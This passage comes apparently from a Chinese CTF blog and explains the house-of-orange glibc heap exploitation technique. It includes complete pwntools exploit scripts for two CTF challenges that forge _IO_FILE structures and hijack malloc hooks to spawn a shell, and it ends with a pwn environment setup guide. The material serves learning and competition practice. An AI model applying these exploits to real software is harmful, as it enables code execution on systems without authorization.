class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">	  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">	  last_stamp = _IO_list_all_stamp;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp = fp-&gt;_chain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>_IO_OVERFLOW的定义如下,它会去调用<strong>overflow函数，而</strong>overflow函数又和_IO_FILE里的函数相关<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure><br>如果我们最终可以伪造IO_FILE结构，就可以达到劫持程序流的目的</p>
<p>_IO_FILE结构如下，struct _IO_FILE <em>_chain是一个用于指向_IO_FILE中下一个成员的指针<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br>   _IO_FILE作为一个单链表结构，_IO_list_all作为表头，利用之前得到的unsorted bin<br>则可以劫持_IO_list_all，将_IO_list_all的值伪造为main_arena+88。此时main_arena+88<br>作为_IO_FILE的头，但是由于main_arena+88是不可控的，所以不能在此处伪造，但我们可以通过<br>struct _IO_FILE </em>_chain将其链接到一个可控的地方来伪造我们的_IO_FILE。当调用_IO_FILE<br>时，由于mian_arena+88的数据不符合，就会通过*_chain去向后搜索，当搜索到我们伪造好的<br>_IO_FILE结构体时就会调用其虚表里的函数。</p>
<p>   而如果将main_arena+88处看作一个_IO_FILE结构体，那么struct _IO_FILE *_chain<br>指针的位置为main_arena+88+0x68，该位置刚好是0x60大小的small bin第一个chunk的地址。<br>如果将伪造好的_IO_FILE结构体布置在那里，那么当程序执行_IO_OVERFLOW时，我们就可以劫持<br>程序流</p>
<p>   那么如何得到一个大小为0x60的small bin呢，在构造unsorted bin的时候我们可以将其size<br>覆盖为0x60，这样在发生unsorted bin 遍历时就会将这个unsorted bin 链入到small bin中，代<br>码如下<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br></pre></td></tr></table></figure></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><pre><code>在伪造_IO_FILE结构时需要注意一下几点
1.fp-&gt;mode = 0
2._IO_write_ptr &lt; _IO_write_base
3._IO_read_ptr = 0x60 (small bin [4])
4._IO_read_base = _IO_list_all - 0x10 (unsorted bin bk)
</code></pre><h2 id="列题"><a href="#列题" class="headerlink" title="列题"></a>列题</h2><h3 id="hitcon-2016-houseoforange"><a href="#hitcon-2016-houseoforange" class="headerlink" title="hitcon_2016_houseoforange"></a>hitcon_2016_houseoforange</h3><h4 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h4><p>build  除了限制了申请次数为3外没什么特别的<br><img src="http://static.zybuluo.com/hgggg/1rppiar2k3d5r9q6vdluva12/11.png" alt="11.png-77.8kB"></p>
<p>漏洞在update上 可以造成堆溢出，得到unsorted bin<br><img src="http://static.zybuluo.com/hgggg/0hej1whkm528phy92uxta6qc/12.png" alt="12.png-66.3kB"></p>
<h4 id="Step1-修改top-chunk-size"><a href="#Step1-修改top-chunk-size" class="headerlink" title="Step1 修改top chunk size"></a>Step1 修改top chunk size</h4><p><img src="http://static.zybuluo.com/hgggg/ji99l97thw1lo8txj2w6ft3z/13.png" alt="13.png-90.3kB"></p>
<p>可以看到top chunk 的size为0x21f81,<br>而经过IDA分析我们最大可以申请大小为0x1000大小的堆块,<br>可以利用堆溢出来修改size位为0xf81,构造如下payload<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">build(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xf81</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure></p>
<h4 id="Step2-unsorted-bin-attack-泄露地址"><a href="#Step2-unsorted-bin-attack-泄露地址" class="headerlink" title="Step2 unsorted bin attack 泄露地址"></a>Step2 unsorted bin attack 泄露地址</h4><p>接下来申请一个大于top chunk的chunk的到unsorted bin<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">build(<span class="number">0x1000</span>,<span class="string">&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure><br><img src="http://static.zybuluo.com/hgggg/bgduyroukjb5oux25dfmyqvl/14.png" alt="14.png-64.1kB"><br>可看到我们的到了一个unsorted bin并且其fd 和 bk指针均指向main_arena_88的位置<br>接下来就是的到unsorted bin 申请chunk 来 libc_base 和 heap_addr 了<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">build(<span class="number">0x400</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Name of house : &#x27;</span>)</span><br><span class="line">main_arena_88 = u64(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = main_arena_88 - <span class="number">0x3c5163</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露堆地址</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap_addr - <span class="number">0xE0</span></span><br></pre></td></tr></table></figure></p>
<h4 id="Step3-伪造-IO-FILE结构体"><a href="#Step3-伪造-IO-FILE结构体" class="headerlink" title="Step3 伪造_IO_FILE结构体"></a>Step3 伪造_IO_FILE结构体</h4><p><img src="http://static.zybuluo.com/hgggg/8v00ux1tq8602vb38j6t6ju0/15.png" alt="15.png-91.7kB"><br><img src="http://static.zybuluo.com/hgggg/m21uqe95v4smhqlw49ggw41g/16.png" alt="16.png-69.2kB"></p>
<p>我们需要将_IO_FIlE按照前面总结的方式伪造，<br>当触发malloc时，glibc会整理unsorted bin，把对应size的chunk放入smallbin里面<br>由于我们申请的chunk不和法，会触发malloc_printerr ，随后_IO_flush_all_lockp会从_IO_list_all指向的FILE结构开始查找，找到合适_IO_FILE作为_IO_OVERFLOW的参数，执行vtable里面的函数，把IO_FILE结构体本身作为参数<br>这时我们只要将__overflow覆盖成system，并在fake_IO_FILE中写入/bin/sh做为参数就能getshell<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x60</span>) <span class="comment">#_IO_read_ptr = 0x60 (small bin [4])</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all_addr-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xC0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) +p64(<span class="number">0</span>) </span><br><span class="line">fake_file += p64(heap_base+<span class="number">0x5E8</span>)<span class="comment">#vtable指针,同时，也作为fake_vtable的__dummy 这里的0x5E8=0x510+0xC0+0x18</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">2</span> <span class="comment">#__dummy2、__finish</span></span><br><span class="line">fake_file += p64(system_addr)<span class="comment">#覆盖__overflow</span></span><br><span class="line">payload += fake_file</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment">#触发malloc</span></span><br></pre></td></tr></table></figure><br>下面是触发malloc后_IO_FILE的情况<br><img src="http://static.zybuluo.com/hgggg/ml2vafj9lvudw6idwgn4yxj8/17.png" alt="17.png-161.9kB"><br><img src="http://static.zybuluo.com/hgggg/dbljk3vs6nsagkwu9xo0jnne/18.png" alt="18.png-99.2kB"><br><img src="http://static.zybuluo.com/hgggg/q3w0yq81kitpr4og8h94bmpm/19.png" alt="19.png-56kB"><br>成功get shell</p>
<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&quot;node4.buuoj.cn&quot;,25967)</span></span><br><span class="line">p = process(<span class="string">&#x27;/home/hgg/Desktop/houseoforange_hitcon_2016&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;/home/hgg/Desktop/houseoforange_hitcon_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;199&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;120&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">build(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf81</span>)</span><br><span class="line">update(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">build(<span class="number">0x1000</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">build(<span class="number">0x400</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name of house : &quot;</span>)</span><br><span class="line">main_arena_88 = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = main_arena_88 - <span class="number">0x3c5163</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line">update(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap_addr - <span class="number">0xe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+ p64(<span class="number">0x60</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload1.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(heap_base + <span class="number">0x5E8</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload1 += p64(system_addr)</span><br><span class="line">payload = payload+payload1</span><br><span class="line">update(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="祥云杯2021-note"><a href="#祥云杯2021-note" class="headerlink" title="祥云杯2021_note"></a>祥云杯2021_note</h3><h4 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h4><p>add</p>
<p><img src="http://static.zybuluo.com/hgggg/utb61irhn7pfb8divn1r5gcm/20.png" alt="20.png-47kB"></p>
<p>say<br><img src="http://static.zybuluo.com/hgggg/myib49627xjbzmxixn6uh05q/21.png" alt="21.png-27.8kB"></p>
<p>show<br><img src="http://static.zybuluo.com/hgggg/6vla2w4fpv4bnyi7a9oekzn9/22.png" alt="22.png-19.7kB"></p>
<h4 id="Step1泄露堆地址"><a href="#Step1泄露堆地址" class="headerlink" title="Step1泄露堆地址"></a>Step1泄露堆地址</h4><p><del>这个不难，有手就行</del>，直接上代码<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;addr: &quot;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure></p>
<h4 id="Step2-house-of-orange得到unsorted-bin"><a href="#Step2-house-of-orange得到unsorted-bin" class="headerlink" title="Step2 house of orange得到unsorted bin"></a>Step2 house of orange得到unsorted bin</h4><p>前面我们通过堆溢出来修改top chunk 的size ，但是这道题不行<br>这道题需要用，scanf的格式化字符串漏洞来修改数据<br>一般来说scanf(“%d”,&amp;a),%d是格式化字符串，&amp;a是参数，scanf的前5个参数都是由寄存器储存的，从第6个开始储存在栈上<br>所以我们构造格式化字符串 %7$s.ljust(8,’\x00’) (原因是栈上的第一个参数会放置我们的格式化字符串，第二个参数则会去作为我们任意地址写的参数)<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">top_chunk = heap_addr + <span class="number">0x40</span></span><br><span class="line">top_size = top_chunk + <span class="number">8</span></span><br><span class="line">say(<span class="string">b&#x27;%7$daaaa&#x27;</span>+p64(top_size),<span class="built_in">str</span>(<span class="number">0xfb1</span>))</span><br></pre></td></tr></table></figure><br><img src="http://static.zybuluo.com/hgggg/70yvps4st5g58xgbznkad2rl/23.png" alt="23.png-19.5kB"><br>可以看到top chunk 已经被成了伪造0xfb1<br>接下来只要我们连续申请chunk就能得到unsorted bin 来leak libc了<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = libc_addr - <span class="number">0x3C4C61</span></span><br></pre></td></tr></table></figure><br><img src="http://static.zybuluo.com/hgggg/2lsotbhov1sfzdv9d462p2es/24.png" alt="24.png-66kB"></p>
<h4 id="Step3-malloc-hook-劫持为-realloc-，realloc-hook-劫持为-onegadget-来-get-shell"><a href="#Step3-malloc-hook-劫持为-realloc-，realloc-hook-劫持为-onegadget-来-get-shell" class="headerlink" title="Step3  malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget 来 get shell"></a>Step3  malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget 来 get shell</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_gadgets = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">one = libc_base + one_gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">say(<span class="string">b&#x27;%7$saaaa&#x27;</span>+p64(malloc_hook-<span class="number">8</span>),p64(one)+p64(realloc+<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>上述的利用方式仅仅只是对glibc2.23及以下版本有效<br>在glibc2.24 - 2.26 之间增加了对vtable合法性的检查，即虚表的地址必须在<strong>start</strong>libc_IO_vatbales 和 <strong>stop</strong>libc_IO_vtables之间<br>bypass思路：__overflow-&gt;_IO_strn_jump-&gt;_IO_str_finish(_IO_FILE+0x38 = /bin/sh , _IO_FIE+0Xe8 = system)</p>
<pre><code>1.fp-&gt;mode = 0
2._IO_write_ptr &lt; _IO_write_base
3._IO_read_ptr = 0x60 (small bin [4])
4._IO_read_base = _IO_list_all - 0x10 (unsorted bin bk)
5.vtable = _IO_str_jump - 8 
6.byte(fp-&gt;flags) = 0
7.fp -&gt; _IO_buf_base = /bin/sh
8.fp -&gt; 0xe8 = system
</code></pre><p>在glibc2.27之后则是去掉了abort()中的fflush(NULL)使得该漏洞无法得到利用</p>
<p>P.S. 在伪造top chunk时要注意合法性</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.bilibili.com/video/BV1Uv411j7fr?p=28">https://www.bilibili.com/video/BV1Uv411j7fr?p=28</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzkxMTI2NTQ0NA==&amp;mid=2247483912&amp;idx=5&amp;sn=08530a5ac5dd9b87ca43d9abff3939de&amp;chksm=c11f99c3f66810d53cdec65944e86e59af183102337f0f35b284ccb19456bee99df8cbe02255&amp;mpshare=1&amp;scene=23&amp;srcid=08265eMSjEXjdjMfogEOv6UO&amp;sharer_sharetime=1629949810901&amp;sharer_shareid=e6354a0018f4b85eab5b69e4a2130a22#rd">https://mp.weixin.qq.com/s?__biz=MzkxMTI2NTQ0NA==&amp;mid=2247483912&amp;idx=5&amp;sn=08530a5ac5dd9b87ca43d9abff3939de&amp;chksm=c11f99c3f66810d53cdec65944e86e59af183102337f0f35b284ccb19456bee99df8cbe02255&amp;mpshare=1&amp;scene=23&amp;srcid=08265eMSjEXjdjMfogEOv6UO&amp;sharer_sharetime=1629949810901&amp;sharer_shareid=e6354a0018f4b85eab5b69e4a2130a22#rd</a><br><a href="https://www.cnblogs.com/hetianlab/p/13884739.html">https://www.cnblogs.com/hetianlab/p/13884739.html</a><br><a href="https://blog.csdn.net/seaaseesa/article/details/104314949">https://blog.csdn.net/seaaseesa/article/details/104314949</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn笔记</tag>
        <tag>glibc堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn入门之环境搭建</title>
    <url>/2021/10/04/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/30.jpg" alt="pic"></p>
<span id="more"></span>
<h2 id="工具"><a class="header-anchor" href="#工具">¶</a>工具</h2>
<p>VMware15</p>
<p>unbuntu20.0镜像 下载地址：</p>
<pre><code>http://mirrors.163.com/ubuntu-releases/20.04/
</code></pre>
<p>详情请见https://blog.csdn.net/weixin_44169941/article/details/109263134</p>
<h2 id="pwn环境搭建"><a class="header-anchor" href="#pwn环境搭建">¶</a>pwn环境搭建</h2>
<h3 id="安装vscode"><a class="header-anchor" href="#安装vscode">¶</a>安装vscode</h3>
<pre><code>直接在Ubuntu software 安装就行
</code></pre>
<h3 id="安装gcc"><a class="header-anchor" href="#安装gcc">¶</a>安装gcc</h3>
<pre><code>sudo apt install gcc
gcc --version  
</code></pre>
<h3 id="配置32位环境"><a class="header-anchor" href="#配置32位环境">¶</a>配置32位环境</h3>
<pre><code>sudo dpkg --add-architecture i386
sudo apt-get update
sudo apt install build-essential
sudo apt install gcc-multilib
</code></pre>
<h3 id="安装vim"><a class="header-anchor" href="#安装vim">¶</a>安装vim</h3>
<pre><code>sudo apt install vim
</code></pre>
<h3 id="安装git"><a class="header-anchor" href="#安装git">¶</a>安装git</h3>
<pre><code>sudo apt install git
</code></pre>
<h3 id="安装pwntools"><a class="header-anchor" href="#安装pwntools">¶</a>安装pwntools</h3>
<pre><code>sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
sudo python3 -m pip install --upgrade pip
sudo python3 -m pip install --upgrade pwntools
</code></pre>
<h3 id="安装pwndbg-pwngdb-联合调试环境"><a class="header-anchor" href="#安装pwndbg-pwngdb-联合调试环境">¶</a>安装pwndbg + pwngdb 联合调试环境</h3>
<p>pwngdb</p>
<pre><code>cd ~/
git clone https://github.com/scwuaptx/Pwngdb.git 
cp ~/Pwngdb/.gdbinit ~/
</code></pre>
<p>pwndbg</p>
<pre><code>git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
</code></pre>
<p>联合使用</p>
<pre><code>vim ~/.gdbinit
注释掉第一行 然后在第二行写入
source ~/pwndbg/gdbinit.py
</code></pre>
<p>食用方法汇总（持续）</p>
<pre><code>1.带源码调试: gdb -q [file] -d [path]（默认为.）
2.下断点: b address
3.运行: r
4.继续: c
5.运行下一步: ni
6.打印链接库: vmmap
7.输出libc_base: libc
8.查看堆: heap，parseheap
9.查看bins: bin
10.查看address处的内存 x /nxg adress
11.打印地址/指针：p address
12.查看栈：stack length
13.查看地址：telescoope address
14.查看hex: hex address
15.格式化字符串偏移地址: fmtarg 
</code></pre>
<h3 id="安装docker"><a class="header-anchor" href="#安装docker">¶</a>安装docker</h3>
<pre><code>sudo apt install docker.io
</code></pre>
<h3 id="安装seccomp-tools"><a class="header-anchor" href="#安装seccomp-tools">¶</a>安装seccomp-tools</h3>
<pre><code>sudo apt install gcc ruby-dev
gem install seccomp-tools
</code></pre>
<h3 id="安装one-gadget"><a class="header-anchor" href="#安装one-gadget">¶</a>安装one_gadget</h3>
<pre><code>sudo gem install one_gadget
</code></pre>
